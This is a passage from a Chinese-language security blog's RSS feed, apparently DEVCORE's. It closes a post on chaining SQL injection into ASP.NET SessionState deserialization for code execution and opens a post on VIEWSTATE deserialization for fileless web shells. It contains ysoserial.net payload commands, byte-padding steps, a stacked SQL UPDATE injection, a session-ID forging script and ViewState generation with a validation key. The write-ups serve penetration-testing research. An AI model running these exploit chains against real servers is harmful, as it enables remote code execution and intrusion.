                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndOfStreamException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;compressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可以看到實際上 DeserializeStoreData 又是把反序列化過程轉交給其他類別，而依據取出的資料不同，可能會轉交給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateItemCollection.Deserialize&lt;/code&gt; 或 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection.Deserialize&lt;/code&gt; 做處理，在觀察程式碼後發現 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HttpStaticObjectsCollection&lt;/code&gt; 的處理相對單純，所以我個人就選擇往這個分支下去研究。&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sealed&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ICollection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;string&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;typename&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Object&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasInstance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AltSerialization&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadValueFromStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpStaticObjectsEntry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;c1&quot;&gt;// skipped&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_objects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;col&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;跟進去一看，發現 HttpStaticObjectsCollection 取出一些 bytes 之後，又把過程轉交給 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AltSerialization.ReadValueFromStream&lt;/code&gt; 進行處理，看到這的朋友們或許會臉上三條線地心想：「該不會又要追進去吧 . . 」，不過其實到此為止就已足夠，因為 AltSerialization 實際上類似於 BinaryFormatter 的包裝，到此已經有足夠資訊作利用，另外還有一個原因兼好消息，當初我程式碼追到此處時，上網一查這個物件，發現 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; 已經有建立 AltSerialization 反序列化 payload 的 plugin，所以可以直接掏出這個利器來使用！下面一行指令就可以產生執行系統指令 calc.exe 的 base64 編碼後的 payload。&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; Altserialization &lt;span class=&quot;nt&quot;&gt;-M&lt;/span&gt; HttpStaticObjectsCollection &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;calc.exe&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;不過到此還是有個小問題需要解決，ysoserial.net 的 AltSerialization plugin 所建立的 payload 是攻擊 SessionStateItemCollection 或 HttpStaticObjectsCollection 兩個類別的反序列化操作，而我們儲存在資料庫中的 session 序列化資料是由在此之上還額外作了一層包裝的 SessionStateUtility 類別處理的，所以必須要再做點修飾。回頭再去看看程式碼，會發現 SessionStateUtility 也只添加了幾個 bytes，減化後如下所示：&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;對於 Int32 要添加 4 個 bytes，Boolean 則是 1 個 byte，而因為要讓程式路徑能進入 HttpStaticObjectsCollection 的分支，必須讓第 6 個 byte 為 1 才能讓條件達成，先將原本從 ysoserial.net 產出的 payload 從 base64 轉成 hex 表示，再前後各別添加 6、1 bytes，如下示意圖：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  timeout    false  true            HttpStaticObjectsCollection             eof
┌─────────┐  ┌┐     ┌┐    ┌───────────────────────────────────────────────┐ ┌┐
00 00 00 00  00     01    010000000001140001000000fff ... 略 ... 0000000a0b ff
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;修飾完的這個 payload 就能用來攻擊 SessionStateUtility 類別了！&lt;/p&gt;

&lt;p&gt;最後的步驟就是利用開頭的 SQL Injection 將惡意的序列化內容注入進去資料庫，如果正常瀏覽目標網站時有出現 ASP.NET_SessionId 的 Cookie 就代表已經有一筆對應的 Session 記錄儲存在資料庫裡，所以我們只需要執行如下的 SQL Update 語句：&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;?id=1; UPDATE ASPState.dbo.ASPStateTempSessions
       SET SessionItemShort = 0x{Hex_Encoded_Payload}
       WHERE SessionId LIKE &apos;{ASP.NET_SessionId}%25&apos;; --
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;分別將 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{ASP.NET_SessionId}&lt;/code&gt; 替換成自己的 ASP.NET_SessionId 的 Cookie 值以及 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{Hex_Encoded_Payload}&lt;/code&gt; 替換成前面準備好的序列化 payload 即可。&lt;/p&gt;

&lt;p&gt;那假如沒有 ASP.NET_SessionId 怎麼辦？這表示目標可能還未儲存任何資料在 Session 之中，所以也就不會產生任何記錄在資料庫裡，但既然沒有的話，那我們就硬塞一個 Cookie 給它！ASP.NET 的 SessionId 是透過亂數產生的 24 個字元，但使用了客製化的字元集，可以直接使用以下的 Python script 產生一組 SessionId，例如：plxtfpabykouhu3grwv1j1qw，之後帶上 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Cookie: ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; 瀏覽任一個 aspx 頁面，理論上 ASP.NET 就會自動在資料庫裡添加一筆記錄。&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;random&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;abcdefghijklmnopqrstuvwxyz012345&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choice&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chars&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;假如在資料庫裡仍然沒有任何記錄出現，那就只能手動刻 INSERT 的 SQL 來創造一個記錄，至於如何刻出這部分？只要看看程式碼應該就可以很容易構造出來，所以留給大家自行去玩 :P&lt;/p&gt;

&lt;p&gt;等到 Payload 順利注入後，只要再次用這個 Cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASP.NET_SessionId=plxtfpabykouhu3grwv1j1qw&lt;/code&gt; 瀏覽任何一個 aspx 頁面，就會觸發反序列化執行任意系統指令！&lt;/p&gt;

&lt;p&gt;題外話，利用 SessionState 的反序列化取得 ASP.NET 網站應用程式主機控制權的場景並不僅限於 SQL Injection。在內網滲透測試的過程中，經常會遇到的情境是，我們透過各方的資訊洩漏 ( 例如：內部 GitLab、任意讀檔等 ) 取得許多 SQL Server 的帳號、密碼，但唯獨取得不了目標 ASP.NET 網站應用程式的 Windows 主機的帳號密碼，而為了達成目標 ( 控制指定的網站主機 )，我們就曾經使用過這個方式取得目標的控制權，所以作為內網橫向移動的手段也是稍微有價值且非常有趣。至於還能有什麼樣的花樣與玩法，就要靠各位持續地發揮想像力！&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate/</link>
                <guid>https://devco.re/blog/2020/04/21/from-sql-to-rce-exploit-aspnet-app-with-sessionstate</guid>
                <pubDate>Tue, 21 Apr 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>玩轉 ASP.NET VIEWSTATE 反序列化攻擊、建立無檔案後門</title>
                <description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;

&lt;p&gt;這篇文章呼應我在研討會 &lt;a href=&quot;https://devco.re/conf/2019/&quot;&gt;DEVCORE CONFERENCE 2019&lt;/a&gt; 分享的主題，如何用小缺陷一步步擊破使用 ASP.NET 框架所撰寫的堅固的網站應用程式，其中之一的內容就是關於我們在此之前過往紅隊演練專案中，成功數次透過 VIEWSTATE 的反序列化攻擊並製造進入內網突破口的利用方式以及心得，也就是此篇文章的主題。&lt;/p&gt;

&lt;h2 id=&quot;內文&quot;&gt;內文&lt;/h2&gt;

&lt;p&gt;最近微軟產品 Exchange Server 爆出一個嚴重漏洞 CVE-2020-0688，問題發生的原因是每台 Exchange Server 安裝完後在某個 Component 中都使用了同一把固定的 Machine Key，而相信大家都已經很熟悉取得 Machine Key 之後的利用套路了，可以竄改 ASP.NET Form 中的 VIEWSTATE 參數值以進行反序列化攻擊，從而達成 Remote Code Execution 控制整台主機伺服器。&lt;/p&gt;

&lt;p&gt;更詳細的 CVE-2020-0688 漏洞細節可以參考 ZDI blog：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys&quot;&gt;CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;對於 VIEWSTATE exploit 分析在網路上已經有無數篇文章進行深入的探討，所以在此篇文章中將不再重複贅述，而今天主要想聊聊的是關於 VIEWSTATE exploit 在滲透測試中如何進行利用。&lt;/p&gt;

&lt;p&gt;最基本、常見的方式是直接使用工具 &lt;a href=&quot;https://github.com/pwntester/ysoserial.net&quot;&gt;ysoserial.net&lt;/a&gt; 的 ViewState Plugin 產生合法 MAC 與正確的加密內容，TypeConfuseDelegate gadget 經過一連串反射呼叫後預設會 invoke Process.Start 呼叫 cmd.exe，就可以觸發執行任意系統指令。&lt;/p&gt;

&lt;p&gt;例如：&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g TypeConfuseDelegate
              -c &quot;echo 123 &amp;gt; c:\pwn.txt&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;異常的 VIEWSTATE 通常會導致 aspx 頁面回應 500 Internal Server Error，所以我們也無法直接得知指令執行的結果，但既然有了任意執行，要用 PowerShell 回彈 Reverse Shell 或回傳指令結果到外部伺服器上並不是件難事。&lt;/p&gt;

&lt;p&gt;But ..&lt;/p&gt;

&lt;p&gt;在滲透測試的實戰中，事情往往沒這麼美好。現今企業資安意識都相對高，目標伺服器環境出現以下幾種限制都已是常態：&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;封鎖所有主動對外連線&lt;/li&gt;
  &lt;li&gt;禁止查詢外部 DNS&lt;/li&gt;
  &lt;li&gt;網頁目錄無法寫入&lt;/li&gt;
  &lt;li&gt;網頁目錄雖可寫，但存在 Website Defacement 防禦機制，會自動復原檔案&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以這時就可以充分利用另一個 ActivitySurrogateSelectorFromFile gadget 的能力，這個 gadget 利用呼叫 Assembly.Load 動態載入 .NET 組件達成 Remote Code Execution，換句話說，可以使我們擁有在與 aspx 頁面同一個 Runtime 環境中執行任意 .NET 語言程式碼的能力，而 .NET 預設都會存在一些指向共有資源的全域靜態變數可以使用，例如 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/dotnet/api/system.web.httpcontext.current?view=netframework-4.8&quot;&gt;System.Web.HttpContext.Current&lt;/a&gt; 就可以取得當下 HTTP 請求上下文的物件，也就像是我們能利用它來執行自己撰寫的 aspx 網頁的感覺，並且過程全是在記憶體中動態處理，於是就等同於建立了無檔案的 WebShell 後門！&lt;/p&gt;

&lt;p&gt;我們只需要修改 -g 的參數成 ActivitySurrogateSelectorFromFile，而 -c 參數放的就不再是系統指令而是想執行的 ExploitClass.cs C# 程式碼檔案，後面用 ; 分號分隔加上所依賴需要引入的 dll。&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile
              -c &quot;ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll&quot;
              --generator=&quot;CA0B0334&quot;
              --validationalg=&quot;SHA1&quot;
              --validationkey=&quot;B3B8EA291AEC9D0B2CCA5BCBC2FFCABD3DAE21E5&quot;
